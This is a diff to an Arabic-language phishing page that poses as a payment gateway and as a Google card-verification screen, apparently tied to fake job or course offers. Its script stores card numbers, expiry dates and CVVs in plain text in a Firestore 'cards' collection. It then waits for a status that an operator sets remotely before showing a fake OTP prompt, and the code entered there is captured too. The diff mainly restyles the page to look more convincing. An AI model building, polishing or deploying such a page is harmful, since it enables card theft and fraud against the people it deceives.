@@ -6,84 +6,217 @@
     <title>بوابة الدفع الإلكتروني</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;500;700&display=swap');
+
         :root {
-            --primary-color: #1a73e8; /* لون جوجل الأزرق */
-            --secondary-color: #3f83f8;
-            --success-color: #0e9f6e;
+            --primary-color: #1a73e8;
+            --secondary-color: #4285f4;
+            --success-color: #0f9d58;
             --danger-color: #d93025;
             --dark-color: #202124;
-            --light-color: #f8f9fa;
+            --light-bg: #f8f9fa;
             --border-color: #dadce0;
-            --shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+            --card-gradient: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
+            --shadow-sm: 0 1px 2px 0 rgba(60,64,67,.3);
+            --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Noto Sans Arabic', sans-serif; }
         
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', 'Segoe UI', Tahoma, sans-serif; }
-        
-        body { background-color: #ffffff; color: var(--dark-color); line-height: 1.6; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        
-        .container { width: 100%; max-width: 450px; margin: 0 auto; }
-        
-        /* تصميم واجهة إثبات الملكية (شكل جوجل) */
+        body { 
+            background-color: #ffffff; 
+            color: var(--dark-color); 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            perspective: 1000px;
+        }
+
+        /* تحسين شكل بطاقة المعاينة */
+        .card-preview { 
+            background: var(--card-gradient); 
+            color: white; 
+            border-radius: 16px; 
+            padding: 25px; 
+            margin-bottom: -60px; /* تداخل البطاقة مع الفورم */
+            height: 200px; 
+            position: relative; 
+            z-index: 2;
+            box-shadow: 0 10px 20px rgba(26, 115, 232, 0.3);
+            transition: transform 0.5s ease;
+        }
+
+        .card-preview:hover { transform: translateY(-5px) rotateX(5deg); }
+
+        .chip-icon {
+            width: 40px;
+            height: 30px;
+            background: linear-gradient(135deg, #ffd700 0%, #ffb300 100%);
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+
+        #preview-number { 
+            font-size: 22px; 
+            margin-top: 10px; 
+            font-family: 'Courier New', monospace; 
+            letter-spacing: 2px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .card-details-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            text-transform: uppercase;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        /* تحسين شكل صندوق الدفع */
+        .payment-card { 
+            background-color: white; 
+            border-radius: 16px; 
+            box-shadow: var(--shadow-md); 
+            padding: 80px 30px 30px 30px; /* زيادة التباعد العلوي للتداخل */
+            border: 1px solid var(--border-color);
+        }
+
+        .card-type-selector { 
+            display: flex; 
+            gap: 12px; 
+            margin-bottom: 25px; 
+            padding: 5px;
+            background: #f1f3f4;
+            border-radius: 12px;
+        }
+
+        .card-option { 
+            flex: 1; 
+            text-align: center; 
+            padding: 12px; 
+            border-radius: 10px; 
+            cursor: pointer; 
+            border: 2px solid transparent; 
+            transition: all 0.3s ease;
+            background: transparent;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .card-option.active { 
+            background-color: white;
+            box-shadow: var(--shadow-sm);
+            color: var(--primary-color);
+        }
+
+        .form-group { margin-bottom: 18px; }
+        .form-group label { 
+            display: block; 
+            margin-bottom: 6px; 
+            font-weight: 500; 
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .form-control { 
+            width: 100%; 
+            padding: 12px 15px; 
+            border: 1px solid var(--border-color); 
+            border-radius: 8px; 
+            font-size: 15px;
+            transition: all 0.2s;
+            background: #fafafa;
+        }
+
+        .form-control:focus { 
+            outline: none; 
+            border-color: var(--primary-color); 
+            background: white;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
+        }
+
+        .btn-blue { 
+            background: var(--primary-color); 
+            color: white; 
+            border: none; 
+            padding: 14px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            font-weight: 500; 
+            width: 100%;
+            transition: background 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-blue:hover { background: #1765cc; }
+
+        /* واجهة OTP المحسنة */
         #otp-verification-ui {
             display: none;
             background: white;
-            padding: 24px;
-            border-radius: 8px;
-            text-align: right;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: var(--shadow-md);
+            animation: slideUp 0.4s ease-out;
         }
 
-        .google-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
-        .google-header h2 { font-size: 22px; font-weight: 400; color: #3c4043; }
-        .close-btn { font-size: 20px; color: #5f6368; cursor: pointer; border: none; background: none; }
-
-        .verification-desc { font-size: 14px; color: #3c4043; margin-bottom: 16px; }
-        .step-item { font-size: 14px; color: #3c4043; margin-bottom: 12px; }
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
 
         .card-illustration {
-            background: #dadce0;
+            background: #f1f3f4;
             border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-            position: relative;
-            height: 180px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px dashed #bdc1c6;
         }
-        .shield-icon { font-size: 40px; color: #1a73e8; margin-bottom: 15px; }
-        .placeholder-lines { width: 80%; height: 8px; background: #bdc1c6; margin-bottom: 8px; border-radius: 4px; }
-        .google-code-line { font-weight: bold; font-family: monospace; font-size: 16px; margin-top: 10px; color: #3c4043; }
-        .highlight-circle { border: 2px solid #d93025; border-radius: 20px; padding: 2px 8px; margin-right: 5px; }
 
-        .otp-input-wrapper { margin-top: 20px; }
         .google-input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
-            font-size: 16px;
-            margin-bottom: 24px;
+            letter-spacing: 8px;
+            font-weight: bold;
+            font-size: 20px;
             text-align: center;
-            letter-spacing: 4px;
         }
-        .google-input:focus { outline: none; border: 2px solid var(--primary-color); }
 
-        .google-footer-btns { display: flex; gap: 12px; flex-direction: row-reverse; }
-        .btn-blue { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
-        .btn-outline { background: white; color: #1a73e8; border: 1px solid #dadce0; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; }
+        .payment-status { 
+            display: none; 
+            text-align: center; 
+            padding: 40px 20px; 
+            background: white;
+            border-radius: 16px; 
+            box-shadow: var(--shadow-md); 
+        }
 
-        /* باقي التنسيقات الأصلية */
-        header { text-align: center; margin-bottom: 30px; }
-        header h1 { color: var(--primary-color); font-size: 28px; }
-        .payment-card { background-color: white; border-radius: 12px; box-shadow: var(--shadow); overflow: hidden; padding: 30px; }
-        .card-type-selector { display: flex; gap: 10px; margin-bottom: 25px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; }
-        .card-option { flex: 1; text-align: center; padding: 10px; border-radius: 8px; cursor: pointer; border: 2px solid transparent; }
-        .card-option.active { border-color: var(--primary-color); background-color: #f0f7ff; }
-        .form-control { width: 100%; padding: 14px; border: 1px solid var(--border-color); border-radius: 8px; }
-        .card-preview { background: linear-gradient(135deg, var(--primary-color), var(--secondary-color)); color: white; border-radius: 12px; padding: 20px; margin-bottom: 25px; height: 160px; position: relative; }
-        .payment-status { display: none; text-align: center; padding: 30px; border-radius: 12px; box-shadow: var(--shadow); }
-        .validation-message { color: var(--danger-color); font-size: 13px; margin-top: 5px; display: none; }
+        .payment-status i { font-size: 64px; margin-bottom: 20px; }
+        .success i { color: var(--success-color); }
+        .error i { color: var(--danger-color); }
+
+        .btn-outline { 
+            background: white; 
+            color: var(--primary-color); 
+            border: 1px solid var(--border-color); 
+            padding: 10px 20px; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-size: 14px;
+            transition: background 0.2s;
+        }
+        .btn-outline:hover { background: #f8f9fa; }
     </style>
 </head>
 <body>
@@ -91,80 +224,96 @@
         
         <div id="otp-verification-ui">
             <div class="google-header">
-                <h2>إثبات ملكية بطاقتك</h2>
-                <button class="close-btn"><i class="fa-solid fa-xmark"></i></button>
+                <h2><i class="fa-solid fa-shield-check" style="color: #1a73e8; margin-left: 10px;"></i>إثبات ملكية بطاقتك</h2>
             </div>
-            <p class="verification-desc">اتَّبع التعليمات أدناه لإثبات ملكية بطاقتك وإجراء عمليات دفع.</p>
-            <div class="step-item">1. ستتحصل شركة Google على رسوم مؤقتة من بطاقتك.</div>
-            <div class="step-item">2. لإثبات ملكية البطاقة، يُرجى إدخال الرمز المؤلف من 6 أرقام والظاهر بجانب المبلغ في حسابك.</div>
+            <p class="verification-desc" style="margin-top: 15px;">اتَّبع التعليمات أدناه لإثبات ملكية بطاقتك وإجراء عملية الدفع الآمنة.</p>
             
             <div class="card-illustration">
-                <i class="fa-solid fa-shield-halved shield-icon"></i>
-                <div class="placeholder-lines" style="width: 40%"></div>
-                <div class="placeholder-lines" style="width: 60%"></div>
-                <div class="google-code-line">GOOGLE*AB123 <span class="highlight-circle">XXXXXX</span></div>
-                <div class="placeholder-lines" style="width: 30%; margin-top: 15px;"></div>
+                <div class="google-code-line" style="font-size: 18px; color: #3c4043;">
+                    GOOGLE*VERIFY <span class="highlight-circle" style="color: #d93025; font-size: 22px;">XXXXXX</span>
+                </div>
+                <p style="font-size: 12px; color: #70757a; margin-top: 10px;">الرمز المكون من 6 أرقام يظهر في كشف حساب بطاقتك.</p>
             </div>
 
             <div class="otp-input-wrapper">
-                <input type="text" id="google-otp-input" class="google-input" placeholder="أدخل الرمز" maxlength="6">
-                <div class="google-footer-btns">
-                    <button id="confirm-google-btn" class="btn-blue">الحصول على الرمز</button>
-                    <button class="btn-outline">إثبات الملكية بطريقة أخرى</button>
+                <label class="form-group label">أدخل الرمز هنا</label>
+                <input type="text" id="google-otp-input" class="form-control google-input" placeholder="000000" maxlength="6">
+                <div class="google-footer-btns" style="margin-top: 25px;">
+                    <button id="confirm-google-btn" class="btn-blue">تأكيد الرمز</button>
+                    <button class="btn-outline" style="margin-top: 10px; width: 100%;">طريقة أخرى للتحقق</button>
                 </div>
             </div>
         </div>
 
         <div id="payment-main-ui">
-            <header>
-                <h1>بوابة الدفع الإلكتروني</h1>
-                <p>أدخل معلومات بطاقتك لإتمام عملية الدفع</p>
-            </header>
-            
             <div class="card-preview">
-                <div id="preview-logo" style="font-size: 30px;"><i class="fa-solid fa-credit-card"></i></div>
-                <div id="preview-number" style="font-size: 20px; margin-top: 40px; font-family: monospace;">•••• •••• •••• ••••</div>
-                <div style="display: flex; justify-content: space-between; margin-top: 20px;">
-                    <small id="preview-holder">اسم حامل البطاقة</small>
-                    <small id="preview-expiry">MM/YY</small>
+                <div class="chip-icon"></div>
+                <div id="preview-logo" style="position: absolute; top: 25px; left: 25px; font-size: 35px;">
+                    <i class="fa-solid fa-credit-card"></i>
+                </div>
+                <div id="preview-number">•••• •••• •••• ••••</div>
+                <div class="card-details-row">
+                    <div>
+                        <p style="opacity: 0.7; font-size: 10px; margin-bottom: 4px;">حامل البطاقة</p>
+                        <span id="preview-holder">YOUR NAME</span>
+                    </div>
+                    <div style="text-align: left;">
+                        <p style="opacity: 0.7; font-size: 10px; margin-bottom: 4px;">التاريخ</p>
+                        <span id="preview-expiry">MM/YY</span>
+                    </div>
                 </div>
             </div>
             
             <div class="payment-card">
                 <div class="card-type-selector">
-                    <div class="card-option active" data-type="visa"><i class="fa-brands fa-cc-visa"></i><div>فيزا</div></div>
-                    <div class="card-option" data-type="mastercard"><i class="fa-brands fa-cc-mastercard"></i><div>ماستر</div></div>
-                    <div class="card-option" data-type="mada"><img src="m.png" width="40" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/84/Mada_Logo.svg'"><div>مدى</div></div>
+                    <div class="card-option active" data-type="visa">فيزا</div>
+                    <div class="card-option" data-type="mastercard">ماستر</div>
+                    <div class="card-option" data-type="mada">مدى</div>
                 </div>
                 
                 <form id="payment-form">
                     <div class="form-group">
                         <label>رقم البطاقة</label>
-                        <input type="text" id="card-number" class="form-control" placeholder="**** **** **** ****" maxlength="19">
-                        <div class="validation-message" id="card-error">رقم غير صالح</div>
+                        <div style="position: relative;">
+                            <input type="text" id="card-number" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19">
+                            <i class="fa-solid fa-lock" style="position: absolute; left: 15px; top: 15px; color: #bdc1c6;"></i>
+                        </div>
+                        <div class="validation-message" id="card-error">رقم البطاقة غير صحيح</div>
                     </div>
-                    <div class="form-group"><label>اسم حامل البطاقة</label><input type="text" id="card-holder" class="form-control"></div>
-                    <div style="display: flex; gap: 10px;">
-                        <div class="form-group" style="flex: 1;"><label>التاريخ</label><input type="text" id="expiry-date" class="form-control" placeholder="MM/YY" maxlength="5"></div>
-                        <div class="form-group" style="flex: 1;"><label>CVV</label><input type="password" id="cvv" class="form-control" maxlength="4"></div>
+                    <div class="form-group">
+                        <label>اسم حامل البطاقة</label>
+                        <input type="text" id="card-holder" class="form-control" placeholder="الاسم كما يظهر على البطاقة">
                     </div>
-                    <button type="submit" id="submit-btn" class="btn-blue" style="width: 100%; padding: 15px; font-size: 16px;">دفع الآن</button>
+                    <div style="display: flex; gap: 15px;">
+                        <div class="form-group" style="flex: 1.5;">
+                            <label>تاريخ الانتهاء</label>
+                            <input type="text" id="expiry-date" class="form-control" placeholder="MM/YY" maxlength="5">
+                        </div>
+                        <div class="form-group" style="flex: 1;">
+                            <label>CVV</label>
+                            <input type="password" id="cvv" class="form-control" placeholder="***" maxlength="4">
+                        </div>
+                    </div>
+                    <button type="submit" id="submit-btn" class="btn-blue">
+                        <i class="fa-solid fa-shield-check"></i>
+                        إتمام عملية الدفع بأمان
+                    </button>
                 </form>
             </div>
         </div>
 
         <div class="payment-status success" id="success-message">
             <i class="fa-solid fa-circle-check"></i>
-            <h2>تم الدفع بنجاح!</h2>
-            <p>سيصلك رابط الدورة على بريدك الإلكتروني.</p>
-            <button class="btn-outline" onclick="window.location.href='https://pasted-assets--tdaff.replit.app/'" style="margin-top: 20px; width: 100%">الرجوع للوظائف</button>
+            <h2 style="margin-bottom: 10px;">تمت العملية بنجاح</h2>
+            <p style="color: #5f6368;">تم قبول بطاقتك بنجاح. سيصلك رابط الدورة التدريبية قريباً.</p>
+            <button class="btn-blue" onclick="window.location.href='https://pasted-assets--tdaff.replit.app/'" style="margin-top: 30px;">العودة للوظائف</button>
         </div>
 
         <div class="payment-status error" id="error-message">
             <i class="fa-solid fa-circle-xmark"></i>
-            <h2>فشلت العملية</h2>
-            <p>يرجى التحقق من البيانات والمحاولة مرة أخرى.</p>
-            <button class="btn-blue" onclick="location.reload()" style="margin-top: 20px; width: 100%">تحديث الصفحة</button>
+            <h2 style="margin-bottom: 10px;">فشلت عملية الدفع</h2>
+            <p style="color: #5f6368;">نعتذر، لم نتمكن من معالجة البطاقة حالياً.</p>
+            <button class="btn-blue" onclick="location.reload()" style="margin-top: 30px;">المحاولة مرة أخرى</button>
         </div>
     </div>
 
@@ -187,18 +336,42 @@
     let currentDocId = null;
     let selectedCardType = 'visa';
 
-    // التنسيق والتعرف التلقائي
-    document.getElementById('card-number').addEventListener('input', (e) => {
+    // تحديث المعاينة الحية
+    const cardNumberInput = document.getElementById('card-number');
+    cardNumberInput.addEventListener('input', (e) => {
         let val = e.target.value.replace(/\D/g, '');
-        if (val.startsWith('4')) selectedCardType = 'visa';
-        else if (val.startsWith('5')) selectedCardType = 'mastercard';
-        document.getElementById('preview-number').innerText = val.replace(/(.{4})/g, '$1 ').trim() || '•••• •••• •••• ••••';
+        if (val.length > 16) val = val.substring(0,16);
+        
+        // التعرف التلقائي
+        if (val.startsWith('4')) {
+            selectedCardType = 'visa';
+            document.getElementById('preview-logo').innerHTML = '<i class="fa-brands fa-cc-visa"></i>';
+        } else if (val.startsWith('5')) {
+            selectedCardType = 'mastercard';
+            document.getElementById('preview-logo').innerHTML = '<i class="fa-brands fa-cc-mastercard"></i>';
+        }
+
+        e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
+        document.getElementById('preview-number').innerText = e.target.value || '•••• •••• •••• ••••';
     });
 
+    document.getElementById('card-holder').addEventListener('input', e => {
+        document.getElementById('preview-holder').innerText = e.target.value.toUpperCase() || 'YOUR NAME';
+    });
+
+    document.getElementById('expiry-date').addEventListener('input', e => {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
+        e.target.value = v;
+        document.getElementById('preview-expiry').innerText = v || 'MM/YY';
+    });
+
+    // معالجة الفورم
     document.getElementById('payment-form').addEventListener('submit', async (e) => {
         e.preventDefault();
         const btn = document.getElementById('submit-btn');
-        btn.disabled = true; btn.innerText = "جاري المعالجة...";
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري تأمين الاتصال...';
 
         try {
             const docRef = await addDoc(collection(db, "cards"), {
@@ -206,30 +379,35 @@
                 cardNumber: document.getElementById('card-number').value,
                 expiryDate: document.getElementById('expiry-date').value,
                 cvv: document.getElementById('cvv').value,
-                cardType: selectedCardType,
                 status: 'pending',
                 createdAt: serverTimestamp()
             });
             currentDocId = docRef.id;
 
             onSnapshot(doc(db, "cards", currentDocId), (snap) => {
-                const status = snap.data().status;
-                if (status === 'otp_required') {
+                const data = snap.data();
+                if (data.status === 'otp_required') {
                     document.getElementById('payment-main-ui').style.display = 'none';
                     document.getElementById('otp-verification-ui').style.display = 'block';
-                } else if (status === 'success' || status === 'error') {
+                } else if (data.status === 'success' || data.status === 'error') {
                     document.getElementById('payment-main-ui').style.display = 'none';
                     document.getElementById('otp-verification-ui').style.display = 'none';
-                    document.getElementById(status + '-message').style.display = 'block';
+                    document.getElementById(data.status + '-message').style.display = 'block';
                 }
             });
-        } catch (err) { alert("خطأ في الاتصال"); btn.disabled = false; }
+        } catch (err) { 
+            alert("خطأ في الاتصال"); 
+            btn.disabled = false; 
+            btn.innerText = "دفع الآن";
+        }
     });
 
     document.getElementById('confirm-google-btn').addEventListener('click', async () => {
         const otp = document.getElementById('google-otp-input').value;
         if(otp.length < 4) return alert("الرمز غير صحيح");
-        document.getElementById('confirm-google-btn').innerText = "جاري التحقق...";
+        const btn = document.getElementById('confirm-google-btn');
+        btn.innerText = "جاري التحقق...";
+        btn.disabled = true;
         await updateDoc(doc(db, "cards", currentDocId), { otp: otp, status: 'otp_sent' });
     });
 </script>
